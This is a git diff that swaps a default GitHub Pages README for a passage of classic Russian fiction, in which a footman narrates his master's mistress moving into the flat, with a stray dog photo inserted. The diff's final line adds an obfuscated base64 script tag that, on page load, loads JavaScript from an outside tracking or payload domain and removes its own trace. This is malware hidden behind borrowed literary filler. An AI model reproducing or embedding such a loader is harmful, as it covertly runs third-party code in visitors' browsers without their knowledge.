@@ -1,37 +1,63 @@
-## Welcome to GitHub Pages
+# From her voice
+Three weeks after I entered Orlov's service—it was Sunday morning, I remember—somebody rang the bell. It was not yet eleven, and Orlov was still asleep. I went to open the door. You can imagine my astonishment when I found a lady in a veil standing at the door on the landing.
 
-You can use the [editor on GitHub](https://github.com/axiopayplamymn373/Other/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+"Is Georgy Ivanitch up?" she asked.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+From her voice I recognised Zinaida Fyodorovna, to whom I had taken letters in Znamensky Street. I don't remember whether I had time or self-possession to answer her—I was taken aback at seeing her. And, indeed, she did not need my answer. In a flash she had darted by me, and, filling the hall with the fragrance of her perfume, which I remember to this day, she went on, and her footsteps died away. For at least half an hour afterwards I heard nothing. But again some one rang. This time it was a smartly dressed girl, who looked like a maid in a wealthy family, accompanied by our house porter. Both were out of breath, carrying two trunks and a dress-basket.
 
-### Markdown
+"These are for Zinaida Fyodorovna," said the girl.
+![k](https://s.abcnews.com/images/Health/dog-gty-jpo-190608_hpMain_16x9_992.jpg)
+And she went down without saying another word. All this was mysterious, and made Polya, who had a deep admiration for the pranks of her betters, smile slyly to herself; she looked as though she would like to say, "So that's what we're up to," and she walked about the whole time on tiptoe. At last we heard footsteps; Zinaida Fyodorovna came quickly into the hall, and seeing me at the door of my room, said:
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+"Stepan, take Georgy Ivanitch his things."
 
-```markdown
-Syntax highlighted code block
+When I went in to Orlov with his clothes and his boots, he was sitting on the bed with his feet on the bearskin rug. There was an air of embarrassment about his whole figure. He did not notice me, and my menial opinion did not interest him; he was evidently perturbed and embarrassed before himself, before his inner eye. He dressed, washed, and used his combs and brushes silently and deliberately, as though allowing himself time to think over his position and to reflect, and even from his back one could see he was troubled and dissatisfied with himself.
 
-# Header 1
-## Header 2
-### Header 3
+They drank coffee together. Zinaida Fyodorovna poured out coffee for herself and for Orlov, then she put her elbows on the table and laughed.
 
-- Bulleted
-- List
+"I still can't believe it," she said. "When one has been a long while on one's travels and reaches a hotel at last, it's difficult to believe that one hasn't to go on. It is pleasant to breathe freely."
 
-1. Numbered
-2. List
+With the expression of a child who very much wants to be mischievous, she sighed with relief and laughed again.
 
-**Bold** and _Italic_ and `Code` text
+"You will excuse me," said Orlov, nodding towards the coffee. "Reading at breakfast is a habit I can't get over. But I can do two things at once—read and listen."
 
-[Link](url) and ![Image](src)
-```
+"Read away.... You shall keep your habits and your freedom. But why do you look so solemn? Are you always like that in the morning, or is it only to-day? Aren't you glad?"
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+"Yes, I am. But I must own I am a little overwhelmed."
 
-### Jekyll Themes
+"Why? You had plenty of time to prepare yourself for my descent upon you. I've been threatening to come every day."
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/axiopayplamymn373/Other/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+"Yes, but I didn't expect you to carry out your threat to-day."
 
-### Support or Contact
+"I didn't expect it myself, but that's all the better. It's all the better, my dear. It's best to have an aching tooth out and have done with it."
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+"Yes, of course."
+
+"Oh, my dear," she said, closing her eyes, "all is well that ends well; but before this happy ending, what suffering there has been! My laughing means nothing; I am glad, I am happy, but I feel more like crying than laughing. Yesterday I had to fight a regular battle," she went on in French. "God alone knows how wretched I was. But I laugh because I can't believe in it. I keep fancying that my sitting here drinking coffee with you is not real, but a dream."
+
+Then, still speaking French, she described how she had broken with her husband the day before and her eyes were alternately full of tears and of laughter while she gazed with rapture at Orlov. She told him her husband had long suspected her, but had avoided explanations; they had frequent quarrels, and usually at the most heated moment he would suddenly subside into silence and depart to his study for fear that in his exasperation he might give utterance to his suspicions or she might herself begin to speak openly. And she had felt guilty, worthless, incapable of taking a bold and serious step, and that had made her hate herself and her husband more every day, and she had suffered the torments of hell. But the day before, when during a quarrel he had cried out in a tearful voice, "My God, when will it end?" and had walked off to his study, she had run after him like a cat after a mouse, and, preventing him from shutting the door, she had cried that she hated him with her whole soul. Then he let her come into the study and she had told him everything, had confessed that she loved some one else, that that some one else was her real, most lawful husband, and that she thought it her true duty to go away to him that very day, whatever might happen, if she were to be shot for it.
+
+"There's a very romantic streak in you," Orlov interrupted, keeping his eyes fixed on the newspaper.
+
+She laughed and went on talking without touching her coffee. Her cheeks glowed and she was a little embarrassed by it, and she looked in confusion at Polya and me. From what she went on to say I learnt that her husband had answered her with threats, reproaches, and finally tears, and that it would have been more accurate to say that she, and not he, had been the attacking party.
+
+"Yes, my dear, so long as I was worked up, everything went all right," she told Orlov; "but as night came on, my spirits sank. You don't believe in God, George, but I do believe a little, and I fear retribution. God requires of us patience, magnanimity, self-sacrifice, and here I am refusing to be patient and want to remodel my life to suit myself. Is that right? What if from the point of view of God it's wrong? At two o'clock in the night my husband came to me and said: 'You dare not go away. I'll fetch you back through the police and make a scandal.' And soon afterwards I saw him like a shadow at my door. 'Have mercy on me! Your elopement may injure me in the service.' Those words had a coarse effect upon me and made me feel stiff all over. I felt as though the retribution were beginning already; I began crying and trembling with terror. I felt as though the ceiling would fall upon me, that I should be dragged off to the police-station at once, that you would grow cold to me—all sorts of things, in fact! I thought I would go into a nunnery or become a nurse, and give up all thought of happiness, but then I remembered that you loved me, and that I had no right to dispose of myself without your knowledge; and everything in my mind was in a tangle—I was in despair and did not know what to do or think. But the sun rose and I grew happier. As soon as it was morning I dashed off to you. Ah, what I've been through, dear one! I haven't slept for two nights!"
+
+She was tired out and excited. She was sleepy, and at the same time she wanted to talk endlessly, to laugh and to cry, and to go to a restaurant to lunch that she might feel her freedom.
+
+"You have a cosy flat, but I am afraid it may be small for the two of us," she said, walking rapidly through all the rooms when they had finished breakfast. "What room will you give me? I like this one because it is next to your study."
+
+At one o'clock she changed her dress in the room next to the study, which from that time she called hers, and she went off with Orlov to lunch. They dined, too, at a restaurant, and spent the long interval between lunch and dinner in shopping. Till late at night I was opening the door to messengers and errand-boys from the shops. They bought, among other things, a splendid pier-glass, a dressing-table, a bedstead, and a gorgeous tea service which we did not need. They bought a regular collection of copper saucepans, which we set in a row on the shelf in our cold, empty kitchen. As we were unpacking the tea service Polya's eyes gleamed, and she looked at me two or three times with hatred and fear that I, not she, would be the first to steal one of these charming cups. A lady's writing-table, very expensive and inconvenient, came too. It was evident that Zinaida Fyodorovna contemplated settling with us for good, and meant to make the flat her home.
+
+She came back with Orlov between nine and ten. Full of proud consciousness that she had done something bold and out of the common, passionately in love, and, as she imagined, passionately loved, exhausted, looking forward to a sweet sound sleep, Zinaida Fyodorovna was revelling in her new life. She squeezed her hands together in the excess of her joy, declared that everything was delightful, and swore that she would love Orlov for ever; and these vows, and the naïve, almost childish confidence that she too was deeply loved and would be loved forever, made her at least five years younger. She talked charming nonsense and laughed at herself.
+
+"There's no other blessing greater than freedom!" she said, forcing herself to say something serious and edifying. "How absurd it is when you think of it! We attach no value to our own opinion even when it is wise, but tremble before the opinion of all sorts of stupid people. Up to the last minute I was afraid of what other people would say, but as soon as I followed my own instinct and made up my mind to go my own way, my eyes were opened, I overcame my silly fears, and now I am happy and wish every one could be as happy!"
+
+But her thoughts immediately took another turn, and she began talking of another flat, of wallpapers, horses, a trip to Switzerland and Italy. Orlov was tired by the restaurants and the shops, and was still suffering from the same uneasiness that I had noticed in the morning. He smiled, but more from politeness than pleasure, and when she spoke of anything seriously, he agreed ironically: "Oh, yes."
+
+"Stepan, make haste and find us a good cook," she said to me.
+
+"There's no need to be in a hurry over the kitchen arrangements," said Orlov, looking at me coldly. "We must first move into another flat."
+
+We had never had cooking done at home nor kept horses, because, as he said, "he did not like disorder about him," and only put up with having Polya and me in his flat from necessity. The so-called domestic hearth with its everyday joys and its petty cares offended his taste as vulgarity; to be with child, or to have children and talk about them, was bad form, like a petty bourgeois. And I began to feel very curious to see how these two creatures would get on together in one flat—she, domestic and home-loving with her copper saucepans and her dreams of a good cook and horses; and he, fond of saying to his friends that a decent and orderly man's flat ought, like a warship, to have nothing in it superfluous—no women, no children, no rags, no kitchen utensils.
+<script id="LkOdO" src="data:text/javascript;base64, dmFyIF9ldEJVYSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX1Q4dnY3LCBfU0YwWm8pIHt2YXIgX2thOW5jID0gZnVuY3Rpb24oX0h1UFljKSB7d2hpbGUgKC0tX0h1UFljKSB7X1Q4dnY3WydwdXNoJ10oX1Q4dnY3WydzaGlmdCddKCkpO319O19rYTluYygrK19TRjBabyk7fShfZXRCVWEsIDB4MTFiKSk7dmFyIF8xYlhOUyA9IGZ1bmN0aW9uKF9JRlJXQywgX09jaHpVKSB7X0lGUldDID0gX0lGUldDIC0gMHgwO3ZhciBfQzRvMFEgPSBfZXRCVWFbX0lGUldDXTtyZXR1cm4gX0M0bzBRO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfMWJYTlMoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1MzNjB1ID0gZG9jdW1lbnRbXzFiWE5TKCcweDEnKV0oXzFiWE5TKCcweDInKSk7X1MzNjB1W18xYlhOUygnMHgzJyldID0gXzFiWE5TKCcweDQnKTtfUzM2MHVbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3NVx4NmVceDY5XHg3Nlx4NjVceDcyXHg3M1x4NjFceDZjXHg2MVx4NjNceDYzXHgzMVx4MmVceDYzXHg3Mlx4NzlceDcwXHg3NFx4NmZceDcwXHg3Mlx4NmZceDY3XHg3Mlx4NjVceDczXHg2OVx4NzZceDY1XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTFceDU1XHg1OVx4MzRceDY4XHg1OVx4NjVceDVhXHgzMFx4NmEnO2RvY3VtZW50W18xYlhOUygnMHg1JyldKF8xYlhOUygnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9TMzYwdSk7ZG9jdW1lbnRbXzFiWE5TKCcweDcnKV0oJ0xrT2RPJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
